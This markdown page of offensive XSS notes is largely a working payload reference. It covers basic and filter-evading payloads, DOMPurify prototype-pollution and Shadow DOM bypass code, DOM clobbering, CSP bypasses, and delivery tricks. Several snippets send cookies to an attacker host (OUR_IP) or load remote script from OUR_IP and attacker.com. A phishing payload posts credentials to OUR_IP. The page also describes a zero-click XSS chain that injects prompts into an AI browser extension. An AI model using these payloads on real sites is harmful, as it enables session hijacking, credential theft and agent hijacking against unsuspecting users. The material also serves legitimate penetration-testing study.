+++
title = 'Cross-Site Scripting (XSS)'
date = 2026-10-30
type = 'notes'
weight = 10
toc = true
tags = ['web', 'web-attacks', 'xss']
+++

Here is the revised and expanded **Cross-Site Scripting (XSS)** reference. The original payloads, encoding tables, and delivery techniques are preserved. The major additions address the 2025–2026 reality: **DOM-based XSS has overtaken reflected XSS** as the primary high-value target, **Trusted Types adoption is slow and bypassable**, **sanitizer bypasses (DOMPurify prototype pollution, Shadow DOM)** are now a first-class attack class, and **AI agents are a new injection surface**.

---


XSS remains the most consistently exploitable web vulnerability class because the attack surface keeps expanding: frameworks add new sinks, sanitizers add new bypasses, and browsers ship new APIs before their security model is fully understood. **Reflected XSS is largely caught by scanners now**; the current high-value targets are **DOM-based XSS** (unsafe `innerHTML`, `document.write`, framework-specific sinks), **sanitizer bypasses** (prototype pollution, Shadow DOM), and **CSP misconfigurations**.

> **Source:** [PortSwigger — Cross-Site Scripting](https://portswigger.net/web-security/cross-site-scripting)

---

## 1. Useful References and Tools

### Training

- [xssy.uk](https://xssy.uk/) — hands-on XSS labs

### Payload and research references (2026-maintained)

| Resource | What it covers |
|---|---|
| [ardakocadoru/xss-cheatsheet](https://github.com/ardakocadoru/xss-cheatsheet) | Reflected, stored, DOM, blind, WAF evasion, CSP bypass, mXSS, prototype pollution, real CVEs — **updated 2026** |
| [Karthikdude/Advanced-XSS](https://github.com/Karthikdude/Advanced-XSS) | **Feb 2026 update**: AI agent weaponization, polymorphic payloads, DOMPurify mXSS, CSP nonce leakage, postMessage, CSWSH, GraphQL→XSS, DOM clobbering, SSE injection |
| [PayloadsAllTheThings — XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) | Broad payload collection |
| [s0md3v/AwesomeXSS](https://github.com/s0md3v/AwesomeXSS) | Bypass techniques |
| [payloadbox/xss-payload-list](https://github.com/payloadbox/xss-payload-list) | Large payload list |
| [terjanq/Tiny-XSS-Payloads](https://github.com/terjanq/Tiny-XSS-Payloads) | Minimal payloads |

### Scanners and automation

| Tool | Notes |
|---|---|
| **XSStrike** | Classic active scanner; still useful for reflection analysis |
| **UniXSS** | Unicode normalization helper |
| **Senshi** | **LLM-powered** — generates context-aware payloads, analyzes responses, chains findings into attack paths |
| **XSSGAI** | AI-powered payload generator trained on real-world XSS patterns |
| **ReflexionX** | Autonomous XSS hunting: AI payload generation + **Playwright browser validation** — verifies execution, not just reflection |
| **redai-cli** | Multi-tool red-team CLI with XSS payload generation (`payload_gen`) |

> **The 2026 detection gap:** most scanners report any reflection as XSS. The reliable pipeline is **discovery → injection → browser verification** — a payload that is reflected but does not execute in a headless browser is not a finding.

---

## 2. Basic XSS Payloads

| Payload | Description |
|---|---|
| `<script>alert(window.origin)</script>` | Basic XSS |
| `<plaintext>` | Basic XSS |
| `<script>print()</script>` | Basic XSS |
| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS |
| `<script src="http://OUR_IP/script.js"></script>` | Load remote script |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Exfiltrate cookie |

### 2.1 2025–2026 payload additions

Modern filters block `alert` and `onerror` first. These alternatives still execute:

```html
<!-- New event handlers that bypass older blacklists -->
<details ontoggle=alert(1) open></details>
<video onloadstart=alert(1) src=x></video>
<audio oncanplay=alert(1) src=x></audio>
<dialog oncancel=alert(1) open></dialog>

<!-- ES6 module import — executes without a classic <script src> -->
<script type="module">import('data:text/javascript,alert(1)')</script>
<script type="module">import('//attacker.com/payload.js')</script>

<!-- Blob URL — survives some src filters -->
<iframe src="blob:data:text/html,<script>alert(1)</script>"></iframe>
<object data="blob:data:text/html,<script>alert(1)</script>"></object>
```



---

## 3. XSS Filters and WAF Evasion

### 3.1 WAF fingerprinting

- `wafw00f https://target.com`
- Cookie values set by the WAF (e.g. F5 BIG-IP ASM cookies start with `TS`)
- `Server` and other non-standard headers
- HTTP body hints
- [Awesome-WAF](https://github.com/0xInfection/Awesome-WAF) — fingerprinting reference

### 3.2 Extra hints and tricks

- If `alert()` is filtered, use `confirm()` or `prompt()`.
- Close tags with `//` instead of `>`.
- Access DOM objects by name: `cookie` instead of `document.cookie`, `domain` instead of `document.domain`.
- Shorten protocols: `//`, `/\\`, `\\` instead of `http(s)://`.
- Quotes are optional if there are no spaces: `<img src=http://example.com`.
- If all standard HTML tags are filtered, try custom ones: `<22>alert()</22>`.

### 3.3 Alternative encodings

The full HTML/numeric/JS/URL/CSS encoding table from your original notes remains valid. The key 2025 addition is **Unicode normalization**:

> Unicode normalization standardizes different binary representations of the same character. If the backend or frontend normalizes input after filtering, you may be able to bypass a WAF by sending a **normalization-equivalent** character that the filter does not recognize.

| Character | Normalization-equivalent (URL-encoded) |
|---|---|
| `<` | `%EF%BC%9C` |
| `>` | `%EF%BC%9E` |
| `'` | `%EF%BC%87` |
| `"` | `%EF%BC%82` |
| `=` | `%E2%81%BC` |
| `/` | `%EF%BC%8F` |

**Tools:** [UniXSS](https://github.com/alessio-romano/UniXSS), [normalization table](https://0xacb.com/normalization_table).

### 3.4 Basic bypasses

**Alert alternatives:** `prompt(1)`, `confirm(1)`, `alert(/xss/.source)`, `windows/alert/.source`

**onerror alternatives:** `onload=alert(1)`, `onfocus=alert(1)` + `autofocus`, `setTimeout(alert(1))`, `setInterval(alert(1))`, `Function(alert(1))()`, `setImmediate(alert(1))` (IE 10+)

**Img tag alternatives:** `<svg/onload=alert(1)>`, `<video src=x onerror=alert(1)>`, `<audio src=x onerror=alert(1)>`

**Base64:** `atob("<BASE64>")`; data URI: `data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`

**JavaScript Unicode escapes:** `\u0061lert(document.cookie)` — where `\u0061` is `a`.

**JSFuck:** only `[]()!+` — [jsfuck.com](https://jsfuck.com/) / [repo](https://github.com/aemkei/jsfuck)

**Tabs and newlines:** `j&Tab;avascript&colon;alert()` — bypasses `javascript:` blacklists.

---

## 4. Sanitizer Bypasses (2025–2026) — The New Front Line

Sanitizers like DOMPurify are the standard defense against XSS in rich-text and HTML-rendering contexts. 2025–2026 produced a steady stream of bypasses, primarily through **prototype pollution** and **DOM structural confusion**.

### 4.1 DOMPurify prototype pollution — CVE-2026-41238

**Affected:** DOMPurify **3.0.1 through 3.3.3** (default configuration, no `CUSTOM_ELEMENT_HANDLING` option).

**Root cause:** During config parsing, `CUSTOM_ELEMENT_HANDLING = cfg.CUSTOM_ELEMENT_HANDLING || {}` creates a plain object that inherits from `Object.prototype`. If an attacker has **any prototype pollution primitive** elsewhere in the application (lodash, jQuery.extend, a query-string parser, a deep-merge utility), they can pollute `Object.prototype.tagNameCheck` and `Object.prototype.attributeNameCheck` with permissive regexes like `/.*/`. DOMPurify then allows **all custom elements with all attributes, including event handlers**.

```javascript
// Step 1 — prototype pollution gadget elsewhere in the app
Object.prototype.tagNameCheck = /.*/;
Object.prototype.attributeNameCheck = /.*/;

// Step 2 — default DOMPurify.sanitize()
const clean = DOMPurify.sanitize('<x-x onfocus=alert(document.cookie) tabindex=0 autofocus>');
// The custom element and its onfocus handler survive sanitization
```

**Fixed in 3.4.0**.

### 4.2 DOMPurify `USE_PROFILES` prototype pollution — CVE-2026-65913

**Affected:** DOMPurify **before 3.3.2** in `USE_PROFILES` mode.

The flaw allows **`Array.prototype` pollution** — an attacker sets properties like `onclick` to `true`, causing DOMPurify to accept event handlers as allowlisted attributes.

**Fixed in 3.3.2**.

### 4.3 DOMPurify Shadow DOM bypass — CVE-2026-49978

**Affected:** DOMPurify **≤ 3.4.6** (IN_PLACE sanitization).

If the HTML contains a `<template>` element, and inside that template there is an element with a **shadow DOM attached to it**, DOMPurify **silently skips the shadow contents**. Whatever the attacker placed in the shadow root — an `onerror` handler, a `javascript:` URL, a full script — survives untouched. When the application clones the template and inserts the result, the payload executes as if it had never been sanitized.

**Fixed in 3.4.7**.

### 4.4 Mutation XSS (mXSS) — the general class

mXSS occurs when a sanitizer's serialization → re-parsing cycle **mutates** the markup into an executable form. The 2025–2026 techniques include:

- **Namespace confusion** — SVG/MathML content that re-parses differently in HTML context
- **`<noscript>` parsing differential** — the parser treats content inside `<noscript>` differently depending on scripting flags
- **Form/table restructuring** — the HTML parser moves tags in ways that create new sinks

> **The 2026 pattern:** sanitizer bypasses are now almost always **chains** — a prototype pollution primitive, a DOM clobbering primitive, or a parsing differential enables the final XSS. Enumerate for **all three** on any application that uses DOMPurify or the Sanitizer API.

---

## 5. DOM Clobbering (2026)

DOM clobbering uses HTML elements with `id` or `name` attributes to **override global variables or object properties** that JavaScript later reads. It is especially valuable in **CSP-restricted environments** where inline scripts are blocked — you do not need to execute JavaScript, only to change the value of a variable that existing JavaScript trusts.

```html
<!-- Override window.config -->
<form id="config"><input name="apiUrl" value="https://attacker.com/steal"></form>

<!-- Override a property on an existing object -->
<a id="x"></a><a id="x" name="y" href="javascript:alert(1)"></a>
```

**2026 additions:**

- **Deep property chains** — clobbering nested properties via `HTMLCollection` and `form.elements`
- **Evolved DOM clobbering (CVE-2025-1647)** — bypasses sanitizers that strip `id`/`name` on some elements but not others
- **Works with Trusted Types** — because it does not require a string-to-sink assignment, it can bypass a Trusted Types policy that only protects `innerHTML`

---

## 6. CSP Bypass (2026)

Content Security Policy is the primary XSS mitigation, and it remains **bypassable when misconfigured**.

### 6.1 `script-src` allowlist abuse

- **JSONP endpoint bypass** — any allowlisted domain hosting a JSONP endpoint can be abused to inject arbitrary JavaScript
- **AngularJS via CDN** — if `script-src` allows a CDN hosting AngularJS, the `ng-app` attribute enables **client-side template injection (CSTI)**, which evaluates expressions and executes JavaScript. This exact pattern was used against HackMD: CSP trusted `cdnjs.cloudflare.com`, AngularJS was loaded from there, and CSTI executed in document viewers' browsers.

### 6.2 Missing directives

- **Missing `base-uri 'self'`** — an injected `<base>` tag redirects all relative URL resources to an attacker-controlled origin.
- **Missing `default-src 'none'` baseline** — a policy that relies entirely on allowlisted domains is weaker than it appears.

### 6.3 Trusted Types

Trusted Types restricts DOM sinks (`innerHTML`, `document.write`, `eval`) to typed values created by a registered policy, not raw strings. It closes the DOM-XSS gap CSP cannot reach.

**But:**

- **Adoption is slow.** Many teams run in **report-only mode** for months — which **does not block exploitation**, only reports violations. Do not treat a `Content-Security-Policy-Report-Only` header as a defense.
- **Bypasses persist.** Firefox's `XSLTProcessor.transformToFragment()` allowed arbitrary JavaScript execution via `xsl:copy-of`, **completely bypassing Trusted Types enforcement**.
- **Coverage gaps** — Trusted Types protects string-to-sink assignments but not **DOM clobbering** or **prototype pollution** chains that change values without a string assignment.

### 6.4 Advanced CSP bypass — nonce leakage

If the CSP uses a per-request nonce, the nonce can be **leaked via CSS injection and browser caching** — extracting the nonce from a cached page and reusing it in an injected `<script nonce=...>`.

---

## 7. Prototype Pollution → DOM XSS (2026)

Client-side prototype pollution becomes a **DOM XSS primitive** when a polluted property flows into a dangerous sink. This is now one of the most reliable sanitizer-adjacent bypasses.

**CVE-2026-113659 (ApostropheCMS)** — `apos.http.parseQuery()` built a nested object from a URL query string without sanitizing `__proto__`, `constructor`, or `prototype` keys. The polluted property reached a **Vue behaviour gadget** and executed script in the victim's session.

```javascript
// URL query string that pollutes Object.prototype
?__proto__[isAdmin]=true&__proto__[url]=javascript:alert(1)

// If a gadget reads the polluted property and passes it to a sink, XSS fires
```

**Common gadget properties** that flow into sinks: `url`, `src`, `href`, `innerHTML`, `template`, `isAdmin` (auth bypass → then XSS).

> **Testing approach:** enumerate `__proto__`, `constructor.prototype`, and `prototype` in every query-string parser, JSON body, and deep-merge utility. Then trace where the polluted property is read — a gadget is required for XSS, pollution alone is not enough.

---

## 8. Shadow DOM and Web Components (New Attack Surface)

Shadow DOM encapsulates DOM and CSS, but **it is not a security boundary for script already executing in the same origin/realm**. It creates assessment surfaces when applications mix **closed roots**, **Declarative Shadow DOM (DSD)**, and HTML parsing/sanitizing APIs.

### 8.1 Sanitizer skips shadow content

The DOMPurify CVE-2026-49978 pattern is the canonical example: a `<template>` containing an element with an attached shadow root causes the sanitizer to **skip the shadow contents** entirely.

### 8.2 ShadowPrompt — zero-click DOM XSS → AI prompt injection

A 2026 exploit chain combined a **wildcard origin allowlist** in the Claude Chrome extension with a **DOM-based XSS in a third-party CAPTCHA subdomain** to inject arbitrary prompts **without any user interaction**. This is the new class: **XSS as an AI-agent injection vector**, not just a cookie thief.

---

## 9. XSS Payload Delivery

### 9.1 URL shortening

- [tinyurl.com](https://tinyurl.com/), [shorturl.at](https://www.shorturl.at/), [bitly.com](https://bitly.com/), [yourls.org](https://yourls.org/)
- **Caveat:** some providers preview the destination, defeating the obfuscation.

### 9.2 UserInfo obfuscation

`www.google.com:searchqwhatever@google.com` — Firefox and Opera show an alert; **Chrome allows it silently**.

### 9.3 Alternative IP representations

| Form | Example (for `216.58.215.78`) |
|---|---|
| **DWORD** | `http://3627734862` |
| **Octal** | `http://0330.0072.0327.0116` |
| **Hexadecimal** | `http://0xd83ad74e` or `http://0xd8.0x3a.0xd7.0x4e` |

Generate with:
```javascript
// DWORD
"192.168.1.1".split('.').reduce((d,o) => (d << 8) + Number(o), 0) >>> 0;
// Octal
"192.168.1.1".split('.').map(o => '0' + (+o).toString(8)).join('.');
// Hex
"192.168.1.1".split('.').map(o => '0x' + (+o).toString(16)).join('.');
```

---

## 10. XSS — Other Attacks

### 10.1 Open redirect → XSS

```
vulnerable.com/test.php?redirect_url=javascript:alert(document.domain)
```

### 10.2 Stored XSS via PDF upload

PDFs with embedded XSS payloads can trigger in internal viewers (`pdf.js`, browser extensions, server-side previews). **Most modern viewers sandbox PDFs**, so the payload is usually limited to `alert()` — no cookie access.

- [PayloadsAllThePDFs](https://github.com/luigigubello/PayloadsAllThePDFs)

### 10.3 Session hijacking

```html
<script src=http://OUR_IP/script.js></script>
```

`script.js`:
```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
// or
document.location='http://OUR_IP/index.php?c='+document.cookie;
```

### 10.4 Phishing

- Clone with `wget` or [goclone](https://github.com/imthaghost/goclone)
- `urlcrazy www.example.com` — generate similar domain names
- Stored XSS → fake login form:
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

### 10.5 Defacing (requires stored XSS)

| Payload | Effect |
|---|---|
| `document.body.style.background = "#141d2b"` | Background color |
| `document.body.background = "https://example.com/logo.svg"` | Background image |
| `document.title = 'New Title'` | Title |
| `document.getElementById("todo").innerHTML = "New Text"` | Element content |

---

## 11. Miscellaneous

### 11.1 `<base>` tag injection

An injected `<base href="https://yourserver.example/" />` redirects **all relative URLs** in the page to the attacker's server. If the page loads `/static/script.js` via a relative path, the attacker hosts that file and gets XSS.

### 11.2 Cross-Site Tracing (XST)

XST uses the `TRACE`/`TRACK` HTTP methods to reflect cookies even when `HttpOnly` is set. **Modern browsers block `TRACE` in scripting languages** — this is largely legacy, effective only with Java applets.

### 11.3 AI agent weaponization (2026)

The new frontier: XSS is no longer only about stealing cookies. A DOM-based XSS can inject **prompts** into an AI agent's context — the ShadowPrompt chain injected arbitrary prompts into Claude's Chrome extension with zero clicks. This means XSS findings on AI-integrated applications should be assessed for **prompt injection impact**, not just session theft.

---

## 12. Quick Reference — 2026 Additions

| Technique / CVE | What it does | Where it lives |
|---|---|---|
| **CVE-2026-41238** | DOMPurify prototype pollution → XSS (default config) | Sanitizer bypass |
| **CVE-2026-65913** | DOMPurify `USE_PROFILES` `Array.prototype` pollution | Sanitizer bypass |
| **CVE-2026-49978** | DOMPurify Shadow DOM skip via `<template>` | Sanitizer bypass |
| **CVE-2026-113659** | ApostropheCMS query-string prototype pollution → DOM XSS | Prototype pollution chain |
| **mXSS** | Namespace confusion, `<noscript>` differential, form/table restructuring | Sanitizer bypass class |
| **DOM clobbering (2026)** | `id`/`name` property override, deep chains, HTMLCollection | CSP-restricted environments |
| **Trusted Types bypass** | Firefox `XSLTProcessor` / `xsl:copy-of` | CSP bypass |
| **JSONP / Angular CDN** | Allowlisted domain → CSTI → JavaScript | CSP bypass |
| **Nonce leakage** | CSS injection + browser cache | CSP bypass |
| **ShadowPrompt** | Zero-click DOM XSS → AI prompt injection | AI agent surface |
| **Senshi / XSSGAI / ReflexionX** | AI payload generation + browser validation | Tooling |

---

## 13. Field Notes

- **DOM-based XSS is the current high-value target.** Reflected XSS is largely caught by scanners; `innerHTML`, `document.write`, and framework sinks are where the bugs live.
- **Sanitizer bypasses are chains.** A DOMPurify bypass is rarely a single payload — it is a prototype pollution primitive, a DOM clobbering primitive, or a parsing differential **feeding** the sanitizer.
- **Trusted Types in report-only mode is not a defense.** It reports violations without blocking them.
- **Shadow DOM is not a security boundary.** Sanitizers that skip shadow content (CVE-2026-49978) turn encapsulation into a bypass.
- **AI agents are a new XSS impact class.** A DOM XSS that injects prompts is not just a session thief — it is an agent hijack.
- **Browser verification is mandatory.** A reflected payload that does not execute in a real browser is not a finding — use Playwright or a headless browser to confirm execution.
- **Enumerate every source, not just the URL.** `localStorage`, `postMessage`, `window.name`, and `document.referrer` are DOM XSS sources that never appear in server logs.

This file sits alongside the **Fuzzing** and **Information Gathering** notes: the discovery pipeline finds the injection points, and this file turns a reflection into a confirmed, weaponized finding.
